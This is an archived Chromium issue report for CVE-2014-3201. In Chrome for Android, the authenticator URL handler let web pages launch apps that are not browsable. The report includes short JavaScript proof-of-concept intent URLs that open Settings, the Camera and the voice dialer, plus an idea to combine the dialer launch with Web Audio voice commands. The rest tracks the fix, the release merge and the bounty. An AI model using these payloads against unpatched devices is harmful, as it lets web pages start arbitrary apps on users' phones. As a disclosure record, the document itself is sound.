# Security: handleAuthenticatorUrl  to launch any activity from web page

| Field | Value |
|-------|-------|
| **Issue ID** | [40080610](https://issues.chromium.org/issues/40080610) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Mobile>Intents |
| **Platforms** | Android |
| **CVE IDs** | CVE-2014-3201 |
| **Reporter** | wi...@gmail.com |
| **Assignee** | ja...@chromium.org |
| **Created** | 2014-10-09 |
| **Bounty** | $2,000.00 |

## Description

**VULNERABILITY DETAILS**  

handleAuthenticatorUrl in com.google.android.apps.chrome.tab.AuthenticatorHelper  

can launch unintended activity (those without BROWSABLE category) on phone.

**VERSION**  

Chrome Version: Chrome for Android 37.0.2062.117  

Operating System: Android 4.4.2

**REPRODUCTION CASE**

open the following html in chrome will start Settings applications in Android

<body>
<script>
var url = "intent:#Intent;action=com.google.android.apps.authenticator.AUTHENTICATE;SEL;component=com.android.settings/.Settings;end";
location.href = url;
</script>
</body>

another example url to launch camera application:  

var url = "intent:#Intent;action=com.google.android.apps.authenticator.AUTHENTICATE;SEL;component=com.android.camera2/com.android.camera.CameraActivity;end";

## Attachments

- [test3.html](attachments/test3.html) (text/html, 2.0 KB)

## Timeline

### mb...@chromium.org (2014-10-09)

Thanks for the report.

Adding some ccs from https://crbug.com/chromium/370399. Does anyone know who a good owner for this might be?

### [Deleted User] (2014-10-09)

+CC jaekyun@ who's currently working in that area. Jaekyun, you want to take this on?

### [Deleted User] (2014-10-09)

FTR: since the code in handleAuthenticatorUrl looks like it's copy-pasted from UrlHandler it should be easy to port the fixes from 370399.

### cl...@chromium.org (2014-10-09)

[Empty comment from Monorail migration]

### ja...@chromium.org (2014-10-09)

I will take a look at this issue.

### ja...@chromium.org (2014-10-10)

I've uploaded https://chrome-internal-review.googlesource.com/#/c/179039 to fix this issue.


### bu...@chromium.org (2014-10-10)

The following change refers to this bug:
https://chrome-internal-review.googlesource.com/179039

### ja...@chromium.org (2014-10-10)

[Empty comment from Monorail migration]

### ja...@chromium.org (2014-10-10)

My change is reverted because it caused lint error.

So I've uploaded https://chrome-internal-review.googlesource.com/#/c/179246/ after fixing the lint error.


### ja...@chromium.org (2014-10-10)

The change is landed successfully.

### ja...@chromium.org (2014-10-12)

BTW, isn't M38 already released? Maybe we only need to merge the patch into M39 because this isn't any regression.

### [Deleted User] (2014-10-13)

38 has been released, per https://crbug.com/chromium/421817#c11, punting to 39. 

### am...@chromium.org (2014-10-13)

merge approved for m39 branch 2171

### ja...@chromium.org (2014-10-13)

[Empty comment from Monorail migration]

### ja...@chromium.org (2014-10-13)

https://chrome-internal-review.googlesource.com/#/c/179331/ is just merged to m39.

### cl...@chromium.org (2014-10-14)

[Empty comment from Monorail migration]

### wi...@gmail.com (2014-10-16)

Note that explicit intent can also be used here (instead of using selector) to bypass security check.
An interesting exploit would be to start a voice dialer while playing a voice command with Web Audio API.

var url = "intent:#Intent;action=com.google.android.apps.authenticator.AUTHENTICATE;component=com.android.voicedialer/.VoiceDialerActivity;end";

see attachment.


### ja...@chromium.org (2014-10-16)

My patch covers that explicit intent as well because it resets component information of both an intent and a selector in an intent.


### in...@chromium.org (2014-11-05)

[Empty comment from Monorail migration]

### in...@chromium.org (2014-11-05)

[Empty comment from Monorail migration]

### wi...@gmail.com (2014-11-13)

Chrome 39 for android is out, when will this issue get a CVE identifier?

### ja...@chromium.org (2014-11-13)

What is a CVE identifier?

### wi...@gmail.com (2014-11-13)

please see https://cve.mitre.org/cve/identifiers/
for example, in the following release notes, a CVE identifier (CVE-2014-3201) is assigned:
http://googlechromereleases.blogspot.com/2014/10/chrome-for-android-update.html

### ja...@chromium.org (2014-11-13)

Grace, whom should I contact in Chrome team to get a CVE identifier for this issue?


### mb...@chromium.org (2014-11-13)

When Chrome 39 is released, I'll update this with the CVE.

### mb...@chromium.org (2014-11-17)

Thanks for the report! This one qualified for a $2000 reward.

### wi...@gmail.com (2014-11-17)

Thanks a lot, you are so kind! if possible, please credit me as "WangTao(neobyte) of Baidu X-Team". 

### ti...@google.com (2014-12-09)

Reward payment in progress.

### ti...@google.com (2014-12-09)

[Empty comment from Monorail migration]

### cl...@chromium.org (2015-01-19)

Bulk update: removing view restriction from closed bugs.

### kk...@chromium.org (2016-02-15)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-10-01)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2016-10-02)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### mb...@chromium.org (2016-10-02)

[Empty comment from Monorail migration]

### aw...@chromium.org (2018-04-25)

[Empty comment from Monorail migration]

### is...@google.com (2018-04-25)

This issue was migrated from crbug.com/chromium/421817?no_tracker_redirect=1

[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40080610)*
